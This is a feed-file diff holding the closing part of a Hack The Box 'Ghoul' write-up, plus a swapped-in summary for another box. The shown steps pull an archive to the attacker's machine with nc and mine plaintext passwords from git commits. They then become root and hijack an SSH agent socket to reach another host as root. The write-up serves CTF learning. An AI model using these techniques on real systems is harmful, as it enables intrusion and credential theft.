-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3713ea5e4353:~# ls -la
-total 128
-drwx------    1 root     root          4096 Dec 29  2018 .
-drwxr-xr-x    1 root     root          4096 Dec 13  2018 ..
-lrwxrwxrwx    1 root     root             9 Dec 29  2018 .ash_history -&amp;gt; /dev/null
-lrwxrwxrwx    1 root     root             9 Dec 29  2018 .bash_history -&amp;gt; /dev/null
--rw-r--r--    1 root     root        117507 Dec 29  2018 aogiri-app.7z
--rwxr-xr-x    1 root     root           179 Dec 16  2018 session.sh
-3713ea5e4353:~#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;while &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do
-  &lt;/span&gt;sleep 300
-  rm &lt;span class=&quot;nt&quot;&gt;-rf&lt;/span&gt; /data/gogs/data/sessions
-  sleep 2
-  curl &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'user_name=kaneki&amp;amp;password=12345ILoveTouka!!!'&lt;/span&gt; http://172.18.0.2:3000/user/login
-&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;This script was executed periodically to terminate the active sessions,  I saved the password because we may need it later. 
-&lt;br /&gt;The other thing was a &lt;code class=&quot;highlighter-rouge&quot;&gt;7z&lt;/code&gt; archive called &lt;code class=&quot;highlighter-rouge&quot;&gt;aogiri-app.7z&lt;/code&gt;, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; to download it on my box :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3713ea5e4353:~# nc -w 3 10.10.xx.xx 1338 &amp;lt; aogiri-app.7z
-3713ea5e4353:~# md5sum aogiri-app.7z 
-88e134a69f8c2f96de31581a52895c07  aogiri-app.7z
-3713ea5e4353:~# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# nc -lp 1338 &amp;gt; aogiri-app.7z
-root@kali:~/Desktop/HTB/boxes/ghoul# md5sum aogiri-app.7z
-88e134a69f8c2f96de31581a52895c07  aogiri-app.7z
-root@kali:~/Desktop/HTB/boxes/ghoul#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;searching-through-git-commits-privilege-escalation-on-kaneki-pc&quot;&gt;Searching Through git Commits, Privilege Escalation on kaneki-pc&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;I created a directory and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;aogiri-app&lt;/code&gt; then I extracted the archive there :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul# mkdir aogiri-app
-root@kali:~/Desktop/HTB/boxes/ghoul# cd aogiri-app/
-root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app# cp ../aogiri-app.7z .
-root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app# 7za x ./aogiri-app.7z 
-
-7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
-p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on)
-
-Scanning the drive for archives:
-1 file, 117507 bytes (115 KiB)
-
-Extracting archive: ./aogiri-app.7z
---
-Path = ./aogiri-app.7z
-Type = 7z
-Physical Size = 117507
-Headers Size = 4011
-Method = LZMA2:192k
-Solid = +
-Blocks = 1
-
-Everything is Ok
-
-Folders: 114
-Files: 125
-Size:       154976
-Compressed: 117507
-root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app# ls -la
-total 128
-drwxr-xr-x 3 root root   4096 Oct  4 17:00 .
-drwxr-xr-x 4 root root   4096 Oct  4 16:59 ..
--rw-r--r-- 1 root root 117507 Oct  4 17:00 aogiri-app.7z
-drwxr-xr-x 5 root root   4096 Dec 29  2018 aogiri-chatapp
-root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;By looking at the extracted files we’ll see that it’s a git repository :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app/aogiri-chatapp# ls -la
-total 52
-drwxr-xr-x 5 root root 4096 Dec 29  2018 .
-drwxr-xr-x 3 root root 4096 Oct  4 17:00 ..
-drwxr-xr-x 8 root root 4096 Dec 29  2018 .git
--rw-r--r-- 1 root root  268 Dec 29  2018 .gitignore
-drwxr-xr-x 3 root root 4096 Dec 29  2018 .mvn
--rwxr-xr-x 1 root root 9113 Dec 29  2018 mvnw
--rw-r--r-- 1 root root 5810 Dec 29  2018 mvnw.cmd
--rw-r--r-- 1 root root 2111 Dec 29  2018 pom.xml
--rw-r--r-- 1 root root  124 Dec 29  2018 README.md
-drwxr-xr-x 4 root root 4096 Dec 29  2018 src
-root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app/aogiri-chatapp# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;And honestly this was a very big rabbit hole, I kept searching through the application code (it was useless and I couldn’t get anything from it) for a long time while it was actually about the &lt;code class=&quot;highlighter-rouge&quot;&gt;git&lt;/code&gt; repository itself. 
-&lt;br /&gt;Let’s check the &lt;code class=&quot;highlighter-rouge&quot;&gt;reflog&lt;/code&gt; to get the commits :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app/aogiri-chatapp# git reflog
-647c5f1 (HEAD -&amp;gt; master, origin/master) HEAD@{0}: commit: changed service               
-b43757d HEAD@{1}: commit: added mysql deps       
-b3752e0 HEAD@{2}: reset: moving to b3752e0                                         
-0d426b5 HEAD@{3}: reset: moving to 0d426b5                                           
-e29ad43 HEAD@{4}: reset: moving to HEAD^                                          
-0d426b5 HEAD@{5}: reset: moving to HEAD                                 
-0d426b5 HEAD@{6}: reset: moving to origin/master                                        
-0d426b5 HEAD@{7}: commit: update dependencies                                          
-e29ad43 HEAD@{8}: commit: added service                          
-b3752e0 HEAD@{9}: commit: noro stop doing stupid shit
-813e0a5 HEAD@{10}: commit: hello world!                              
-ed5a88c HEAD@{11}: commit: mysql support                                               
-51d2c36 HEAD@{12}: commit: added readme                                    
-bec96aa HEAD@{13}: commit: updated dependencies                                        
-8b74520 HEAD@{14}: commit (initial): update readme
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;I checked each commit and in one of the commits (&lt;code class=&quot;highlighter-rouge&quot;&gt;0d426b5&lt;/code&gt;) I found some passwords :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/ghoul/aogiri-app/aogiri-chatapp# git show 0d426b5
-commit 0d426b533d4f1877f8a114620be8a1294f34ab71
-Author: kaneki &amp;lt;kaneki@aogiri.htb&amp;gt;
-Date:   Sat Dec 29 11:44:50 2018 +0530
-
-    update dependencies
-
-diff --git a/pom.xml b/pom.xml
-index 92f24ee..fc1d313 100644
---- a/pom.xml
-+++ b/pom.xml
-@@ -48,6 +48,11 @@
-             		&amp;lt;artifactId&amp;gt;javax.json&amp;lt;/artifactId&amp;gt;
-             		&amp;lt;version&amp;gt;1.0&amp;lt;/version&amp;gt;
- 		&amp;lt;/dependency&amp;gt;
-+		&amp;lt;dependency&amp;gt;
-+              		&amp;lt;groupId&amp;gt;mysql&amp;lt;/groupId&amp;gt;
-+            		&amp;lt;artifactId&amp;gt;mysql-connector-java&amp;lt;/artifactId&amp;gt;
-+            		&amp;lt;version&amp;gt;5.1.46&amp;lt;/version&amp;gt;
-+		&amp;lt;/dependency&amp;gt;
- 
- 	&amp;lt;/dependencies&amp;gt;
- 
-diff --git a/src/main/resources/application.properties b/src/main/resources/application.properties
-index 4cbc10b..41adeb0 100644
---- a/src/main/resources/application.properties
-+++ b/src/main/resources/application.properties
-@@ -1,7 +1,7 @@
- server.port=8080
- spring.datasource.url=jdbc:mysql://localhost:3306/db
--spring.datasource.username=kaneki
--spring.datasource.password=7^Grc%C\7xEQ?tb4
-+spring.datasource.username=root
-+spring.datasource.password=g_xEN$ZuWD7hJf2G
- server.address=0.0.0.0
- 
- spring.jpa.properties.hibernate.dialect = org.hibernate.dialect.MySQL5InnoDBDialect
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;The only host that hasn’t been rooted yet is &lt;code class=&quot;highlighter-rouge&quot;&gt;kaneki-pc&lt;/code&gt; so I tried the 2 passwords and &lt;code class=&quot;highlighter-rouge&quot;&gt;7^Grc%C\7xEQ?tb4&lt;/code&gt; worked, However still no flag :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kaneki_pub@kaneki-pc:~$ su
-Password: 
-root@kaneki-pc:/home/kaneki_pub# cd /root/
-root@kaneki-pc:~# cat root.txt 
-You've done well to come upto here human. But what you seek doesn't lie here. The journey isn't over yet.....
-root@kaneki-pc:~# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;hijacking-the-ssh-forward-agent-root-flag&quot;&gt;Hijacking the SSH Forward Agent, Root Flag&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt;By checking the &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory I saw some directories named &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh-RandomString&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kaneki-pc:~# cd /tmp/
-root@kaneki-pc:/tmp# ls -la
-total 28
-drwxrwxrwt 1 root       root       4096 Oct  4 15:06 .
-drwxr-xr-x 1 root       root       4096 Oct  4 14:45 ..
-drwx------ 1 root       root       4096 Dec 16  2018 ssh-1Oo5P5JuouKm
-drwx------ 1 kaneki_adm kaneki_adm 4096 Dec 16  2018 ssh-FWSgs7xBNwzU
-drwx------ 1 kaneki_pub kaneki     4096 Dec 16  2018 ssh-jDhFSu7EeAnz
--rw------- 1 root       root        400 Oct  4 14:45 sshd-stderr---supervisor-E5awkI.log
--rw------- 1 root       root          0 Oct  4 14:45 sshd-stdout---supervisor-3bRi58.log
-root@kaneki-pc:/tmp# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;And by checking the processes I found that there is a periodic ssh command as root to &lt;code class=&quot;highlighter-rouge&quot;&gt;172.18.0.1&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kaneki-pc:/tmp# ps aux | grep ssh
-root         10  0.0  0.1  72296  6116 pts/0    S    14:45   0:00 /usr/sbin/sshd -D
-root         15  0.0  0.1  74656  6536 ?        Ss   14:48   0:00 sshd: kaneki_pub [priv]
-kaneki_+     17  0.0  0.0  74792  4008 ?        S    14:48   0:00 sshd: kaneki_pub@pts/2
-root        101  0.1  0.1  74656  6572 ?        Ss   15:12   0:00 sshd: kaneki_adm [priv]
-kaneki_+    103  0.0  0.0  74656  3192 ?        S    15:12   0:00 sshd: kaneki_adm@pts/1
-kaneki_+    104  0.1  0.1  45188  5400 pts/1    Ss+  15:12   0:00 ssh root@172.18.0.1 -p 2222 -t ./log.sh
-root        106  0.0  0.0  13212  1020 pts/2    S+   15:12   0:00 grep --color=auto ssh
-root@kaneki-pc:/tmp#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;After searching for a while I found &lt;a href=&quot;https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking/&quot;&gt;this article&lt;/a&gt; which explains it very well. I cleaned the &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kaneki-pc:/tmp# rm -rf ssh-*
-root@kaneki-pc:/tmp# ls -la
-total 16
-drwxrwxrwt 1 root root 4096 Oct  4 15:13 .
-drwxr-xr-x 1 root root 4096 Oct  4 14:45 ..
--rw------- 1 root root  400 Oct  4 14:45 sshd-stderr---supervisor-E5awkI.log
--rw------- 1 root root    0 Oct  4 14:45 sshd-stdout---supervisor-3bRi58.log
-root@kaneki-pc:/tmp# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;Then I waited for the ssh command to get executed again. After some minutes the agent was created :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kaneki-pc:/tmp# ls -la
-total 20
-drwxrwxrwt 1 root       root       4096 Oct  4 15:30 .
-drwxr-xr-x 1 root       root       4096 Oct  4 14:45 ..
-drwx------ 2 kaneki_adm kaneki_adm 4096 Oct  4 15:30 ssh-X2sLvGoeXy
--rw------- 1 root       root        400 Oct  4 14:45 sshd-stderr---supervisor-E5awkI.log
--rw------- 1 root       root          0 Oct  4 14:45 sshd-stdout---supervisor-3bRi58.log
-root@kaneki-pc:/tmp# ls -la ssh-X2sLvGoeXy/
-total 12
-drwx------ 2 kaneki_adm kaneki_adm 4096 Oct  4 15:30 .
-drwxrwxrwt 1 root       root       4096 Oct  4 15:30 ..
-srwxr-xr-x 1 kaneki_adm kaneki_adm    0 Oct  4 15:30 agent.490
-root@kaneki-pc:/tmp# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;I quickly hijacked it :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kaneki-pc:/tmp# export SSH_AUTH_SOCK=/tmp/ssh-X2sLvGoeXy/agent.490
-root@kaneki-pc:/tmp# ssh-add -l
-2048 SHA256:U3NCrv1R4fOSeyIk3W0EcaAm81ETo4dcu5+FBbk3KxE /home/kaneki/.ssh/id_rsa (RSA)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;Then I could &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;172.18.0.1&lt;/code&gt; as root :
-&lt;img src=&quot;/images/hackthebox/ghoul/23.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;And we owned root !
-&lt;br /&gt;That’s it , Feedback is appreciated !
-&lt;br /&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;
-&lt;br /&gt;Thanks for reading.
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/swagshop/&quot;&gt;Hack The Box - Swagshop&lt;/a&gt;
-&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/writeup/&quot;&gt;Hack The Box - Writeup&lt;/a&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="rce" /><category term="ssh" /><category term="git" /><category term="networking" /><category term="pivoting" /><summary type="html">Quick Summary Hey guys, today Ghoul retired and here’s my write-up about it. It was a very hard box with a lot of rabbit holes, tons of enumeration and a lot of pivoting. However I enjoyed most parts of the box and learned some new stuff. It’s a Linux box and its ip is 10.10.10.101, I added it to /etc/hosts as ghoul.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` root@kali:~/Desktop/HTB/boxes/ghoul# nmap -sV -sT -sC -o nmapinitial ghoul.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-04 12:47 EET Nmap scan report for ghoul.htb (10.10.10.101) Host is up (0.22s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA) |_ 256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Aogiri Tree 2222/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA) | 256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA) | 256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519) 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 | http-auth: | HTTP/1.1 401 Unauthorized\x0D |_ Basic realm=Aogiri |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 - Error report Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/ghoul/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="sqli" /><category term="ssh" /><summary type="html">Quick Summary Hey guys, today writeup retired and here’s my write-up about it. It was a very nice box and I enjoyed it. It’s a Linux box and its ip is 10.10.10.138, I added it to /etc/hosts as writeup.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` root@kali:~/Desktop/HTB/boxes/writeup# nmap -sV -sT -sC -o nmapinitial writeup.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-11 16:03 EET Nmap scan report for writeup.htb (10.10.10.138) Host is up (0.14s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA) | 256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA) |_ 256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/writeup/ |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Nothing here yet. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/writeup/0.png" /></entry></feed>
